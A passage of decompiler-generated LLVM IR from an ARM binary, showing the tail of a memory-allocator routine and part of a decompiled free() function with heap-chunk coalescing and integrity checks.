dec_label_pc_13578:                               ; preds = %dec_label_pc_13534.dec_label_pc_13578_crit_edge, %dec_label_pc_1356c
  %v0_1357c = phi i32 [ %v0_1357c.pre, %dec_label_pc_13534.dec_label_pc_13578_crit_edge ], [ %v2_13574, %dec_label_pc_1356c ]
  %v0_13578 = load i32, i32* %r7.global-to-local, align 4
  %v1_13578 = add i32 %v0_13578, 8
  %v2_13578 = inttoptr i32 %v1_13578 to i32*
  %v3_13578 = load i32, i32* %v2_13578, align 4
  store i32 %v3_13578, i32* %r2.global-to-local, align 4
  %v1_1357c = or i32 %v0_1357c, 1
  store i32 %v1_1357c, i32* %r3.global-to-local, align 4
  %v0_13580 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13580, i32* %v2_13578, align 4
  %v0_13584 = load i32, i32* %r1.global-to-local, align 4
  %v1_13584 = load i32, i32* %r2.global-to-local, align 4
  %v2_13584 = add i32 %v1_13584, 12
  %v3_13584 = inttoptr i32 %v2_13584 to i32*
  store i32 %v0_13584, i32* %v3_13584, align 4
  %v0_13588 = load i32, i32* %lr.global-to-local, align 4
  %v1_13588 = load i32, i32* %r1.global-to-local, align 4
  %v3_13588 = add i32 %v1_13588, %v0_13588
  %v4_13588 = inttoptr i32 %v3_13588 to i32*
  store i32 %v0_13588, i32* %v4_13588, align 4
  %v0_1358c = load i32, i32* %r3.global-to-local, align 4
  %v1_1358c = load i32, i32* %r1.global-to-local, align 4
  %v2_1358c = add i32 %v1_1358c, 4
  %v3_1358c = inttoptr i32 %v2_1358c to i32*
  store i32 %v0_1358c, i32* %v3_1358c, align 4
  %v0_13590 = load i32, i32* %r2.global-to-local, align 4
  %v1_13590 = load i32, i32* %r1.global-to-local, align 4
  %v2_13590 = add i32 %v1_13590, 8
  %v3_13590 = inttoptr i32 %v2_13590 to i32*
  store i32 %v0_13590, i32* %v3_13590, align 4
  %v0_13594 = load i32, i32* %r7.global-to-local, align 4
  %v1_13594 = load i32, i32* %r1.global-to-local, align 4
  %v2_13594 = add i32 %v1_13594, 12
  %v3_13594 = inttoptr i32 %v2_13594 to i32*
  store i32 %v0_13594, i32* %v3_13594, align 4
  br label %dec_label_pc_135ac

dec_label_pc_1359c:                               ; preds = %dec_label_pc_13524
  %v2_1359c = add i32 %v1_1352c, %v0_1359c
  %v1_135a0 = or i32 %v2_1359c, 1
  store i32 %v1_135a0, i32* %r3.global-to-local, align 4
  %v1_135a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_135a4 = add i32 %v1_135a4, 4
  %v3_135a4 = inttoptr i32 %v2_135a4 to i32*
  store i32 %v1_135a0, i32* %v3_135a4, align 4
  %v0_135a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_135a8 = load i32, i32* @r4, align 4
  %v2_135a8 = add i32 %v1_135a8, 44
  %v3_135a8 = inttoptr i32 %v2_135a8 to i32*
  store i32 %v0_135a8, i32* %v3_135a8, align 4
  br label %dec_label_pc_135ac

dec_label_pc_135ac:                               ; preds = %dec_label_pc_13578, %dec_label_pc_1359c
  %v0_135ac = load i32, i32* %sl.global-to-local, align 4
  %v2_135ac = icmp eq i32 %v0_135ac, 0
  store i32 %v0_135ac, i32* %r1.global-to-local, align 4
  br i1 %v2_135ac, label %dec_label_pc_135b8.loopexit, label %dec_label_pc_134d4

dec_label_pc_135b8.loopexit:                      ; preds = %dec_label_pc_135ac
  %v0_135b8.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_135b8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_135b8

dec_label_pc_135b8:                               ; preds = %dec_label_pc_135b8.loopexit, %dec_label_pc_134c4
  %v1_135b8 = phi i32 [ %v1_135b8.pre, %dec_label_pc_135b8.loopexit ], [ %v1_135b810, %dec_label_pc_134c4 ]
  %v0_135c0 = phi i32 [ %v0_135b8.pre, %dec_label_pc_135b8.loopexit ], [ %v1_134d0, %dec_label_pc_134c4 ]
  %v9_135b8 = icmp eq i32 %v0_135c0, %v1_135b8
  br i1 %v9_135b8, label %dec_label_pc_13630, label %dec_label_pc_135c0

dec_label_pc_135c0:                               ; preds = %dec_label_pc_135b8
  %v1_135c0 = add i32 %v0_135c0, 4
  store i32 %v1_135c0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_134c4

dec_label_pc_135c8.dec_label_pc_135c8_crit_edge:  ; preds = %dec_label_pc_135c8.preheader, %dec_label_pc_135c8.dec_label_pc_135c8_crit_edge
  %v0_135c8.pre = load i32, i32* @r4, align 4
  %v1_135c8.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_135c8 = mul i32 %v1_135c8.pre, 8
  %v5_135c8 = add i32 %v4_135c8, %v0_135c8.pre
  %v1_135cc = add i32 %v1_135c8.pre, 1
  store i32 %v1_135cc, i32* %r2.global-to-local, align 4
  %v1_135d0 = add i32 %v5_135c8, 44
  store i32 %v1_135d0, i32* %r3.global-to-local, align 4
  %v2_135d8 = add i32 %v5_135c8, 52
  %v3_135d8 = inttoptr i32 %v2_135d8 to i32*
  store i32 %v1_135d0, i32* %v3_135d8, align 4
  %v0_135dc = load i32, i32* %r3.global-to-local, align 4
  %v2_135dc = add i32 %v0_135dc, 12
  %v3_135dc = inttoptr i32 %v2_135dc to i32*
  store i32 %v0_135dc, i32* %v3_135dc, align 4
  %v7_135e0 = icmp sgt i32 %v1_135cc, 95
  br i1 %v7_135e0, label %dec_label_pc_135e4, label %dec_label_pc_135c8.dec_label_pc_135c8_crit_edge

dec_label_pc_135e4:                               ; preds = %dec_label_pc_135c8.dec_label_pc_135c8_crit_edge
  %v0_135e4 = load i32, i32* @r4, align 4
  %v1_135e4 = inttoptr i32 %v0_135e4 to i32*
  %v2_135e4 = load i32, i32* %v1_135e4, align 4
  store i32 %v2_135e4, i32* %r2.global-to-local, align 4
  %v1_135e8 = add i32 %v0_135e4, 864
  %v2_135e8 = inttoptr i32 %v1_135e8 to i32*
  %v3_135e8 = load i32, i32* %v2_135e8, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_135f0 = urem i32 %v2_135e4, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_135f8 = or i32 %v3_135e8, 1
  store i32 %v1_135f8, i32* %r1.global-to-local, align 4
  %v1_135fc = or i32 %v1_135f0, 72
  store i32 %v1_135fc, i32* %r2.global-to-local, align 4
  %v1_13600 = add i32 %v0_135e4, 52
  store i32 %v1_13600, i32* %ip.global-to-local, align 4
  %v2_13604 = add i32 %v0_135e4, 840
  %v3_13604 = inttoptr i32 %v2_13604 to i32*
  store i32 0, i32* %v3_13604, align 4
  %v0_13608 = load i32, i32* %r3.global-to-local, align 4
  %v1_13608 = add i32 %v0_13608, 65536
  store i32 %v1_13608, i32* %r3.global-to-local, align 4
  %v0_1360c = load i32, i32* %r0.global-to-local, align 4
  %v1_1360c = load i32, i32* @r4, align 4
  %v2_1360c = add i32 %v1_1360c, 836
  %v3_1360c = inttoptr i32 %v2_1360c to i32*
  store i32 %v0_1360c, i32* %v3_1360c, align 4
  %v0_13610 = load i32, i32* %r0.global-to-local, align 4
  %v1_13610 = load i32, i32* @r4, align 4
  %v2_13610 = add i32 %v1_13610, 844
  %v3_13610 = inttoptr i32 %v2_13610 to i32*
  store i32 %v0_13610, i32* %v3_13610, align 4
  %v1_13614 = load i32, i32* @r4, align 4
  %v2_13614 = add i32 %v1_13614, 852
  %v3_13614 = inttoptr i32 %v2_13614 to i32*
  store i32 %v1_13608, i32* %v3_13614, align 4
  %v1_13618 = load i32, i32* @r4, align 4
  %v2_13618 = add i32 %v1_13618, 864
  %v3_13618 = inttoptr i32 %v2_13618 to i32*
  store i32 %v1_135f8, i32* %v3_13618, align 4
  %v1_1361c = load i32, i32* @r4, align 4
  %v2_1361c = inttoptr i32 %v1_1361c to i32*
  store i32 %v1_135fc, i32* %v2_1361c, align 4
  %v0_13620 = load i32, i32* %ip.global-to-local, align 4
  %v1_13620 = load i32, i32* @r4, align 4
  %v2_13620 = add i32 %v1_13620, 44
  %v3_13620 = inttoptr i32 %v2_13620 to i32*
  store i32 %v0_13620, i32* %v3_13620, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_13628 = call i32 @sysconf(i32 30, i32 %v1_135f8, i32 %v1_135fc, i32 %v1_13608)
  store i32 %v4_13628, i32* @r0, align 4
  %v1_1362c = load i32, i32* @r4, align 4
  %v2_1362c = add i32 %v1_1362c, 860
  %v3_1362c = inttoptr i32 %v2_1362c to i32*
  store i32 %v4_13628, i32* %v3_1362c, align 4
  br label %dec_label_pc_13630

dec_label_pc_13630:                               ; preds = %dec_label_pc_135b8, %dec_label_pc_135e4
  %v2_13634 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13634, i32* @r4, align 4
  %v1_13638 = load i32, i32* @r0, align 4
  ret i32 %v1_13638

; uselistorder directives
  uselistorder i32 %v0_135e4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_135dc, { 1, 0 }
  uselistorder i32 %v1_135c0, { 1, 0 }
  uselistorder i32 %v0_135ac, { 0, 2, 1 }
  uselistorder i32 %v0_13588, { 1, 0 }
  uselistorder i32 %v1_134d8, { 1, 0, 2 }
  uselistorder i32 %v0_134f0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_134b0, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 2, 1, 0, 3 }
  uselistorder i32 30, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 852, { 4, 5, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_13630, { 1, 0 }
  uselistorder label %dec_label_pc_135c8.dec_label_pc_135c8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_135ac, { 1, 0 }
  uselistorder label %dec_label_pc_13578, { 1, 0 }
  uselistorder label %dec_label_pc_1356c, { 1, 0 }
  uselistorder label %dec_label_pc_13568, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13524, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_1363c = load i32, i32* @r4, align 4
  %v6_1363c = load i32, i32* @r5, align 4
  %v9_1363c = load i32, i32* @r6, align 4
  %v12_1363c = load i32, i32* @r7, align 4
  %v18_1363c = load i32, i32* @lr, align 4
  %v0_13644 = load i32, i32* @r0, align 4
  store i32 %v0_13644, i32* @r6, align 4
  %v2_13644 = icmp eq i32 %v0_13644, 0
  %v2_13648 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r7, align 4
  br i1 %v2_13644, label %dec_label_pc_13850, label %dec_label_pc_13654

dec_label_pc_13654:                               ; preds = %entry
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_13658 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 72) to i32*), align 4
  store i32 %v4_13658, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_13658, i32* %r2.global-to-local, align 4
  %v4_13664 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 36) to i32*), align 4
  store i32 %v4_13664, i32* %r1.global-to-local, align 4
  store i32 %v2_13648, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_13670 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_26010.295 to i32), i32 76) to i32*), align 4
  store i32 %v4_13670, i32* %ip.global-to-local, align 4
  store i32 79484, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13670)
  %v0_1367c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1367c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_13684 = load i32, i32* @r7, align 4
  %v2_13684 = add i32 %v0_13684, 16
  %v3_13684 = inttoptr i32 %v2_13684 to i32*
  %v4_13684 = load i32, i32* %v3_13684, align 4
  store i32 %v4_13684, i32* %ip.global-to-local, align 4
  store i32 79504, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_13684)
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_13694 = load i32, i32* @r7, align 4
  %v2_13694 = add i32 %v0_13694, 32
  %v3_13694 = inttoptr i32 %v2_13694 to i32*
  %v4_13694 = load i32, i32* %v3_13694, align 4
  store i32 %v4_13694, i32* @lr, align 4
  %v0_13698 = load i32, i32* @r6, align 4
  %v1_13698 = add i32 %v0_13698, -4
  %v2_13698 = inttoptr i32 %v1_13698 to i32*
  %v3_13698 = load i32, i32* %v2_13698, align 4
  store i32 %v3_13698, i32* %r2.global-to-local, align 4
  %v1_1369c = inttoptr i32 %v4_13694 to i32*
  %v2_1369c = load i32, i32* %v1_1369c, align 4
  store i32 %v2_1369c, i32* %r3.global-to-local, align 4
  %v1_136a0 = and i32 %v3_13698, -4
  store i32 %v1_136a0, i32* %ip.global-to-local, align 4
  %v1_136a4 = add i32 %v0_13698, -8
  store i32 %v1_136a4, i32* @r5, align 4
  store i32 %v1_136a4, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_136a0, %v2_1369c
  br i1 %tmp, label %dec_label_pc_136d4, label %dec_label_pc_136b4

dec_label_pc_136b4:                               ; preds = %dec_label_pc_13654
  %v1_136b4 = or i32 %v2_1369c, 3
  store i32 %v1_136b4, i32* %r3.global-to-local, align 4
  store i32 %v1_136b4, i32* %v1_1369c, align 4
  %v3_136b8 = load i32, i32* @lr, align 4
  %v4_136b8 = add i32 %v3_136b8, -8
  store i32 %v4_136b8, i32* %lr.global-to-local, align 4
  %v0_136bc = load i32, i32* %ip.global-to-local, align 4
  %v3_136bc = udiv i32 %v0_136bc, 8
  store i32 %v3_136bc, i32* %r1.global-to-local, align 4
  %v1_136c0 = add i32 %v3_136b8, -4
  store i32 %v1_136c0, i32* %r2.global-to-local, align 4
  %v4_136c4 = mul nuw i32 %v3_136bc, 4
  %v5_136c4 = add i32 %v4_136c4, %v1_136c0
  %v6_136c4 = inttoptr i32 %v5_136c4 to i32*
  %v7_136c4 = load i32, i32* %v6_136c4, align 4
  store i32 %v7_136c4, i32* %r3.global-to-local, align 4
  %v1_136c8 = load i32, i32* @r5, align 4
  %v2_136c8 = add i32 %v1_136c8, 8
  %v3_136c8 = inttoptr i32 %v2_136c8 to i32*
  store i32 %v7_136c4, i32* %v3_136c8, align 4
  %v0_136cc = load i32, i32* @r5, align 4
  %v1_136cc = load i32, i32* %r2.global-to-local, align 4
  %v2_136cc = load i32, i32* %r1.global-to-local, align 4
  %v5_136cc = mul i32 %v2_136cc, 4
  %v6_136cc = add i32 %v5_136cc, %v1_136cc
  %v7_136cc = inttoptr i32 %v6_136cc to i32*
  store i32 %v0_136cc, i32* %v7_136cc, align 4
  br label %dec_label_pc_13838

dec_label_pc_136d4:                               ; preds = %dec_label_pc_13654
  %v1_136d4 = and i32 %v3_13698, 2
  %v2_136d4 = icmp eq i32 %v1_136d4, 0
  br i1 %v2_136d4, label %dec_label_pc_136dc, label %dec_label_pc_13810

dec_label_pc_136dc:                               ; preds = %dec_label_pc_136d4
  %v1_136dc = or i32 %v2_1369c, 1
  store i32 %v1_136dc, i32* %r3.global-to-local, align 4
  store i32 %v1_136dc, i32* %v1_1369c, align 4
  %v0_136e4 = load i32, i32* @r6, align 4
  %v1_136e4 = add i32 %v0_136e4, -4
  %v2_136e4 = inttoptr i32 %v1_136e4 to i32*
  %v3_136e4 = load i32, i32* %v2_136e4, align 4
  store i32 %v3_136e4, i32* %r3.global-to-local, align 4
  %v0_136e8 = load i32, i32* @r5, align 4
  %v1_136e8 = load i32, i32* %ip.global-to-local, align 4
  %v2_136e8 = add i32 %v1_136e8, %v0_136e8
  store i32 %v2_136e8, i32* %lr.global-to-local, align 4
  %v1_136ec = urem i32 %v3_136e4, 2
  %v2_136ec = icmp eq i32 %v1_136ec, 0
  %v1_136f0 = add i32 %v2_136e8, 4
  %v2_136f0 = inttoptr i32 %v1_136f0 to i32*
  %v3_136f0 = load i32, i32* %v2_136f0, align 4
  store i32 %v3_136f0, i32* %r8.global-to-local, align 4
  br i1 %v2_136ec, label %dec_label_pc_136f8, label %dec_label_pc_1372c

dec_label_pc_136f8:                               ; preds = %dec_label_pc_136dc
  %v1_136f8 = add i32 %v0_136e4, -8
  %v2_136f8 = inttoptr i32 %v1_136f8 to i32*
  %v3_136f8 = load i32, i32* %v2_136f8, align 4
  store i32 %v3_136f8, i32* %r1.global-to-local, align 4
  %v2_136fc = sub i32 %v0_136e8, %v3_136f8
  store i32 %v2_136fc, i32* %r3.global-to-local, align 4
  %v1_13700 = add i32 %v2_136fc, 8
  %v2_13700 = inttoptr i32 %v1_13700 to i32*
  %v3_13700 = load i32, i32* %v2_13700, align 4
  store i32 %v3_13700, i32* %r2.global-to-local, align 4
  %v1_13704 = add i32 %v3_13700, 12
  %v2_13704 = inttoptr i32 %v1_13704 to i32*
  %v3_13704 = load i32, i32* %v2_13704, align 4
  store i32 %v3_13704, i32* %r4.global-to-local, align 4
  %v9_13708 = icmp eq i32 %v3_13704, %v2_136fc
  %v1_1370c = add i32 %v2_136fc, 12
  %v2_1370c = inttoptr i32 %v1_1370c to i32*
  %v3_1370c = load i32, i32* %v2_1370c, align 4
  store i32 %v3_1370c, i32* %r0.global-to-local, align 4
  br i1 %v9_13708, label %dec_label_pc_13714, label %dec_label_pc_13778

dec_label_pc_13714:                               ; preds = %dec_label_pc_136f8
  %v1_13714 = add i32 %v3_1370c, 8
  %v2_13714 = inttoptr i32 %v1_13714 to i32*
  %v3_13714 = load i32, i32* %v2_13714, align 4
  store i32 %v3_13714, i32* %r3.global-to-local, align 4
  %v9_13718 = icmp eq i32 %v3_13714, %v2_136fc
  br i1 %v9_13718, label %dec_label_pc_13720, label %dec_label_pc_13778

dec_label_pc_13720:                               ; preds = %dec_label_pc_13714
  store i32 %v3_13700, i32* %v2_13714, align 4
  %v0_13724 = load i32, i32* %r0.global-to-local, align 4
  %v1_13724 = load i32, i32* %r2.global-to-local, align 4
  %v2_13724 = add i32 %v1_13724, 12
  %v3_13724 = inttoptr i32 %v2_13724 to i32*
  store i32 %v0_13724, i32* %v3_13724, align 4
  %v0_13728 = load i32, i32* %ip.global-to-local, align 4
  %v1_13728 = load i32, i32* %r1.global-to-local, align 4
  %v2_13728 = add i32 %v1_13728, %v0_13728
  store i32 %v2_13728, i32* %ip.global-to-local, align 4
  %v0_13738.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1373c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1372c

dec_label_pc_1372c:                               ; preds = %dec_label_pc_136dc, %dec_label_pc_13720
  %v0_137b8 = phi i32 [ %v1_136e8, %dec_label_pc_136dc ], [ %v2_13728, %dec_label_pc_13720 ]
  %v0_1373c = phi i32 [ %v3_136f0, %dec_label_pc_136dc ], [ %v0_1373c.pre, %dec_label_pc_13720 ]
  %v1_13750 = phi i32 [ %v2_136e8, %dec_label_pc_136dc ], [ %v0_13738.pre, %dec_label_pc_13720 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_13730 = load i32, i32* @r7, align 4
  %v2_13730 = add i32 %v0_13730, 32
  %v3_13730 = inttoptr i32 %v2_13730 to i32*
  %v4_13730 = load i32, i32* %v3_13730, align 4
  store i32 %v4_13730, i32* %r2.global-to-local, align 4
  %v1_13734 = add i32 %v4_13730, 44
  %v2_13734 = inttoptr i32 %v1_13734 to i32*
  %v3_13734 = load i32, i32* %v2_13734, align 4
  store i32 %v3_13734, i32* %r3.global-to-local, align 4
  %v9_13738 = icmp eq i32 %v1_13750, %v3_13734
  %v1_1373c = and i32 %v0_1373c, -4
  store i32 %v1_1373c, i32* %r0.global-to-local, align 4
  br i1 %v9_13738, label %dec_label_pc_137b8, label %dec_label_pc_13744

dec_label_pc_13744:                               ; preds = %dec_label_pc_1372c
  %v2_13744 = add i32 %v1_13750, %v1_1373c
  store i32 %v2_13744, i32* %r3.global-to-local, align 4
  %v1_13748 = add i32 %v2_13744, 4
  %v2_13748 = inttoptr i32 %v1_13748 to i32*
  %v3_13748 = load i32, i32* %v2_13748, align 4
  store i32 %v3_13748, i32* %r3.global-to-local, align 4
  %v1_1374c = urem i32 %v3_13748, 2
  %v2_1374c = icmp eq i32 %v1_1374c, 0
  %v2_13750 = add i32 %v1_13750, 4
  %v3_13750 = inttoptr i32 %v2_13750 to i32*
  store i32 %v1_1373c, i32* %v3_13750, align 4
  br i1 %v2_1374c, label %dec_label_pc_13758, label %dec_label_pc_13744.dec_label_pc_13788_crit_edge

dec_label_pc_13744.dec_label_pc_13788_crit_edge:  ; preds = %dec_label_pc_13744
  %v0_13798.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13788

dec_label_pc_13758:                               ; preds = %dec_label_pc_13744
  %v0_13758 = load i32, i32* %lr.global-to-local, align 4
  %v1_13758 = add i32 %v0_13758, 8
  %v2_13758 = inttoptr i32 %v1_13758 to i32*
  %v3_13758 = load i32, i32* %v2_13758, align 4
  store i32 %v3_13758, i32* %r1.global-to-local, align 4
  %v1_1375c = add i32 %v3_13758, 12
  %v2_1375c = inttoptr i32 %v1_1375c to i32*
  %v3_1375c = load i32, i32* %v2_1375c, align 4
  store i32 %v3_1375c, i32* %r3.global-to-local, align 4
  %v9_13760 = icmp eq i32 %v3_1375c, %v0_13758
  %v1_13764 = add i32 %v0_13758, 12
  %v2_13764 = inttoptr i32 %v1_13764 to i32*
  %v3_13764 = load i32, i32* %v2_13764, align 4
  store i32 %v3_13764, i32* %r2.global-to-local, align 4
  br i1 %v9_13760, label %dec_label_pc_1376c, label %dec_label_pc_13778

dec_label_pc_1376c:                               ; preds = %dec_label_pc_13758
  %v1_1376c = add i32 %v3_13764, 8
  %v2_1376c = inttoptr i32 %v1_1376c to i32*
  %v3_1376c = load i32, i32* %v2_1376c, align 4
  store i32 %v3_1376c, i32* %r3.global-to-local, align 4
  %v9_13770 = icmp eq i32 %v3_1376c, %v0_13758
  br i1 %v9_13770, label %dec_label_pc_1377c, label %dec_label_pc_13778

dec_label_pc_13778:                               ; preds = %dec_label_pc_13758, %dec_label_pc_13714, %dec_label_pc_136f8, %dec_label_pc_1376c
  %v0_13778 = call i32 @abort()
  store i32 %v0_13778, i32* %r0.global-to-local, align 4
  %v0_1377c.pre = load i32, i32* @r1, align 4
  %v1_1377c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_1377c

dec_label_pc_1377c:                               ; preds = %dec_label_pc_1376c, %dec_label_pc_13778
  %v1_1377c = phi i32 [ %v3_13764, %dec_label_pc_1376c ], [ %v1_1377c.pre, %dec_label_pc_13778 ]
  %v0_1377c = phi i32 [ %v3_13758, %dec_label_pc_1376c ], [ %v0_1377c.pre, %dec_label_pc_13778 ]
  %v2_1377c = add i32 %v1_1377c, 8
  %v3_1377c = inttoptr i32 %v2_1377c to i32*
  store i32 %v0_1377c, i32* %v3_1377c, align 4
  %v0_13780 = load i32, i32* %r2.global-to-local, align 4
  %v1_13780 = load i32, i32* %r1.global-to-local, align 4
  %v2_13780 = add i32 %v1_13780, 12
  %v3_13780 = inttoptr i32 %v2_13780 to i32*
  store i32 %v0_13780, i32* %v3_13780, align 4
  %v0_13784 = load i32, i32* %ip.global-to-local, align 4
  %v1_13784 = load i32, i32* %r0.global-to-local, align 4
  %v2_13784 = add i32 %v1_13784, %v0_13784
  store i32 %v2_13784, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13788

dec_label_pc_13788:                               ; preds = %dec_label_pc_13744.dec_label_pc_13788_crit_edge, %dec_label_pc_1377c
  %v0_13798 = phi i32 [ %v0_13798.pre, %dec_label_pc_13744.dec_label_pc_13788_crit_edge ], [ %v2_13784, %dec_label_pc_1377c ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_1378c = load i32, i32* @r7, align 4
  %v2_1378c = add i32 %v0_1378c, 32
  %v3_1378c = inttoptr i32 %v2_1378c to i32*
  %v4_1378c = load i32, i32* %v3_1378c, align 4
  %v1_13790 = add i32 %v4_1378c, 52
  store i32 %v1_13790, i32* %r3.global-to-local, align 4
  %v1_13794 = add i32 %v4_1378c, 60
  %v2_13794 = inttoptr i32 %v1_13794 to i32*
  %v3_13794 = load i32, i32* %v2_13794, align 4
  store i32 %v3_13794, i32* %r1.global-to-local, align 4
  %v1_13798 = or i32 %v0_13798, 1
  store i32 %v1_13798, i32* %r2.global-to-local, align 4
  %v1_1379c = load i32, i32* %r4.global-to-local, align 4
  %v2_1379c = add i32 %v1_1379c, 12
  %v3_1379c = inttoptr i32 %v2_1379c to i32*
  store i32 %v1_13790, i32* %v3_1379c, align 4
  %v0_137a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_137a0 = load i32, i32* %r4.global-to-local, align 4
  %v2_137a0 = add i32 %v1_137a0, 8
  %v3_137a0 = inttoptr i32 %v2_137a0 to i32*
  store i32 %v0_137a0, i32* %v3_137a0, align 4
  %v0_137a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_137a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_137a4 = add i32 %v1_137a4, 4
  %v3_137a4 = inttoptr i32 %v2_137a4 to i32*
  store i32 %v0_137a4, i32* %v3_137a4, align 4
  %v0_137a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_137a8 = load i32, i32* %r4.global-to-local, align 4
  %v3_137a8 = add i32 %v1_137a8, %v0_137a8
  %v4_137a8 = inttoptr i32 %v3_137a8 to i32*
  store i32 %v0_137a8, i32* %v4_137a8, align 4
  %v0_137ac = load i32, i32* %r4.global-to-local, align 4
  %v1_137ac = load i32, i32* %r1.global-to-local, align 4
  %v2_137ac = add i32 %v1_137ac, 12
  %v3_137ac = inttoptr i32 %v2_137ac to i32*
  store i32 %v0_137ac, i32* %v3_137ac, align 4
  %v0_137b0 = load i32, i32* %r4.global-to-local, align 4
  %v1_137b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_137b0 = add i32 %v1_137b0, 8
  %v3_137b0 = inttoptr i32 %v2_137b0 to i32*
  store i32 %v0_137b0, i32* %v3_137b0, align 4
  br label %dec_label_pc_137c8

dec_label_pc_137b8:                               ; preds = %dec_label_pc_1372c
  %v2_137b8 = add i32 %v1_1373c, %v0_137b8
  store i32 %v2_137b8, i32* %ip.global-to-local, align 4
  %v1_137bc = or i32 %v2_137b8, 1
  store i32 %v1_137bc, i32* %r3.global-to-local, align 4
  %v0_137c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_137c0, i32* %v2_13734, align 4
  %v0_137c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_137c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_137c4 = add i32 %v1_137c4, 4
  %v3_137c4 = inttoptr i32 %v2_137c4 to i32*
  store i32 %v0_137c4, i32* %v3_137c4, align 4
  br label %dec_label_pc_137c8

dec_label_pc_137c8:                               ; preds = %dec_label_pc_13788, %dec_label_pc_137b8
  %v0_137c8 = load i32, i32* %ip.global-to-local, align 4
  %v3_137cc = icmp ult i32 %v0_137c8, 131070
  br i1 %v3_137cc, label %dec_label_pc_13838, label %dec_label_pc_137d0

dec_label_pc_137d0:                               ; preds = %dec_label_pc_137c8
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_137d4 = load i32, i32* @r7, align 4
  %v2_137d4 = add i32 %v0_137d4, 32
  %v3_137d4 = inttoptr i32 %v2_137d4 to i32*
  %v4_137d4 = load i32, i32* %v3_137d4, align 4
  store i32 %v4_137d4, i32* @r4, align 4
  %v1_137d8 = inttoptr i32 %v4_137d4 to i32*
  %v2_137d8 = load i32, i32* %v1_137d8, align 4
  store i32 %v2_137d8, i32* %r3.global-to-local, align 4
  %v1_137dc = and i32 %v2_137d8, 2
  %v2_137dc = icmp eq i32 %v1_137dc, 0
  br i1 %v2_137dc, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_137d0
  store i32 %v4_137d4, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_137d0, %bb
  %v1_137e4 = xor i1 %v2_137dc, true
  call void @__pseudo_cond_branch(i1 %v1_137e4, i32 ptrtoint (i32* @global_var_13488.455 to i32))
  %v0_137e8 = load i32, i32* @r4, align 4
  %v1_137e8 = add i32 %v0_137e8, 44
  %v2_137e8 = inttoptr i32 %v1_137e8 to i32*
  %v3_137e8 = load i32, i32* %v2_137e8, align 4
  store i32 %v3_137e8, i32* %r3.global-to-local, align 4
  %v1_137ec = add i32 %v3_137e8, 4
  %v2_137ec = inttoptr i32 %v1_137ec to i32*
  %v3_137ec = load i32, i32* %v2_137ec, align 4
  store i32 %v3_137ec, i32* %r3.global-to-local, align 4
  %v1_137f0 = add i32 %v0_137e8, 836
  %v2_137f0 = inttoptr i32 %v1_137f0 to i32*
  %v3_137f0 = load i32, i32* %v2_137f0, align 4
